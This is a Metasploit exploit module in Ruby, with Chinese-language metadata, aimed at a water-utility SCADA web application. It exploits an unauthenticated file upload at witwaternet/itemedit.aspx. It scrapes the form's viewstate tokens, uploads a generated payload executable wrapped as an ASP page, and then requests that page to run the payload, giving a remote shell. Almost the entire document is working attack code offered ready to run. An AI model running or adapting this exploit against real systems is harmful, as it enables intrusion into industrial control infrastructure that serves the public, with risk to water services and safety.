require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '工控安全之和达智慧水务SCADA任意上传getshell',
                      'Description' => %q{
                            witwaternet/itemedit.aspx 无需登录等认证即可上传任意文件
                                 },
                      'Author' =>
                          [
                              'Xser',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://wooyun.org/bugs/wooyun-2016-0169958']
                          ],
                      'Privileged' => true,
                      'Platform' => ['win'],
                      'Targets' => [['all of them', {}],],
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def getidentify
    res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path, 'witwaternet', 'itemedit.aspx'),
                           })

    res = res.body.scan(/value=\"(.*)\"/)
    @viewstate = res[0][0]
    @eventidentaion = res[2][0]
  end

  def upload
    getidentify

    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.asp"
    exe = generate_payload_exe
    asp = Msf::Util::EXE.to_exe_asp(exe).to_s

    data = Rex::MIME::Message.new

    data.add_part(@viewstate, nil, nil, "form-data; name=\"__VIEWSTATE\"")
    data.add_part("", nil, nil, "form-data; name=\"__VIEWSTATEENCRYPTED\"")
    data.add_part(@eventidentaion, nil, nil, "form-data; name=\"__EVENTVALIDATION\"")
    data.add_part(asp, 'application/octet-stream', nil, "form-data; name=\"input_file\"; filename=\"#{@fname}\"")
    data.add_part("", 'application/octet-stream', nil, "form-data; name=\"input_file1\"; filename=\"\"")
    data.add_part("", nil, nil, "form-data; name=\"btn_upload\"")
    data.add_part("", nil, nil, "form-data; name=\"hidIndex\"")
    data.add_part("", nil, nil, "form-data; name=\"hidName\"")
    data.add_part("", nil, nil, "form-data; name=\"hidDesc\"")
    data.add_part("", nil, nil, "form-data; name=\"hidCode\"")
    data.add_part("", nil, nil, "form-data; name=\"hidUrl\"")
    data.add_part("", nil, nil, "form-data; name=\"hidSaveStr\"")
    data.add_part("", nil, nil, "form-data; name=\"hidImgUrl\"")
    data.add_part(@fname, nil, nil, "form-data; name=\"hidImgUrl1\"")
    post_data = data.to_s

    print_status("Uploading #{@fname} payload...")
    res = send_request_cgi({
                               'method' => 'POST',
                               'uri' => normalize_uri(target_uri.path, 'witwaternet', 'itemedit.aspx'),
                               'ctype' => "multipart/form-data; boundary=#{data.bound}",
                               'data' => post_data,
                           })
    if res.code.to_s == '200'
      shellpath = normalize_uri(target_uri.path, 'witwaternet', 'images', @fname)
      print_good("Shell address：#{shellpath}")
      print_status("Executing the payload...")
      send_request_cgi(
          {
              'uri' => shellpath,
              'method' => 'GET'
          }, 5)
      print_good("Executed payload")
    else
      fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
    end
  end

  def exploit
    upload
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end
